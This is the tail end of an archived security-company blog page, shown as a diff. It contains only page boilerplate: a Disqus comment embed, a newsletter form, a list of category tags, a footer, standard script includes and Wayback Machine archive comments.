+            <div class="clearfix"></div>
+            </div>
+            <!-- End Categories -->
+
+        </div>
+        <!-- End Post -->
+
+    </div>
+</div>
+<!-- End Article
+================================================== -->
+
+<!-- Begin Comments
+================================================== -->
+
+    <div class="container">
+        <div id="comments" class="row justify-content-center mb-5">
+            <div class="col-md-8">
+                <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'snapsec-co'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://web.archive.org/web/20220716152713/http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="https://web.archive.org/web/20220716152713/http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+            </div>
+        </div>
+    </div>
+
+<!--End Comments
+================================================== -->
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+</div>
+
+
+<!-- Bottom Alert Bar
+================================================== -->
+<div class="alertbar">
+	<div class="container text-center">
+		<span><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/logo.png" alt="Snapsec | Blog"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://web.archive.org/web/20220716152713/https://snapsec.us14.list-manage.com/subscribe/post?u=50c67e68d53e5d91fa87f8496&amp;id=c4ebf52467" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group">
+            <input type="email" placeholder="Email" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+	</div>
+</div>
+
+    
+</div>
+
+<!-- Categories Jumbotron
+================================================== -->
+<div class="jumbotron fortags">
+	<div class="d-md-flex h-100">
+		<div class="col-md-4 transpdark align-self-center text-center h-100">
+            <div class="d-md-flex align-items-center justify-content-center h-100">
+                <h2 class="d-md-block align-self-center py-1 font-weight-light">Explore <span class="d-none d-md-inline">→</span></h2>
+            </div>
+		</div>
+		<div class="col-md-8 p-5 align-self-center text-center">
+            
+            
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#article">article (7)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#broken-access-control">broken-access-control (4)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#general">general (6)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#writeup">writeup (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#mindset">mindset (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#cors">cors (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#2FA">2FA (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#Attacking-Modern-Web-Apps">Attacking-Modern-Web-Apps (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#blog-post">blog-post (3)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#Continuous-security">Continuous-security (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#data-breaches">data-breaches (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#spring4shell">spring4shell (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#attacking-modern-webapps">attacking-modern-webapps (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#authentication">authentication (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#imran">imran (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#pentesting">pentesting (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#blog">blog (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#Security-Simplified">Security-Simplified (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#web-sec">web-sec (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#dev">dev (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#XSS">XSS (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#security-simplified">security-simplified (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#tutorial">tutorial (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/web/20220716152713/https://snapsec.co/blog/categories#security-explained">security-explained (1)</a>
+                
+            
+            
+		</div>
+	</div>
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-6 text-center text-lg-left">
+                Copyright © 2022 Snapsec | blog 
+            </div>
+            
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts
+================================================== -->
+
+<script src="https://web.archive.org/web/20220716152713js_/https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="" crossorigin="anonymous"></script>
+
+<script src="https://web.archive.org/web/20220716152713js_/https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="" crossorigin="anonymous"></script>
+
+<script src="/web/20220716152713js_/https://snapsec.co/blog/assets/js/mediumish.js"></script>
+
+
+
+<script src="/web/20220716152713js_/https://snapsec.co/blog/assets/js/ie10-viewport-bug-workaround.js"></script> 
+
+
+<script id="dsq-count-scr" src="//web.archive.org/web/20220716152713js_/https://snapsec-co.disqus.com/count.js"></script>
+
+
+</body>
+</html>
+<!--
+     FILE ARCHIVED ON 15:27:13 Jul 16, 2022 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 07:33:37 Jan 11, 2025.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+-->
+<!--
+playback timings (ms):
+  captures_list: 0.532
+  exclusion.robots: 0.035
+  exclusion.robots.policy: 0.025
+  esindex: 0.009
+  cdx.remote: 5.704
+  LoadShardBlock: 371.442 (3)
+  PetaboxLoader3.datanode: 230.903 (5)
+  PetaboxLoader3.resolve: 617.521 (2)
+  load_resource: 655.066
+  loaddict: 131.47
+-->
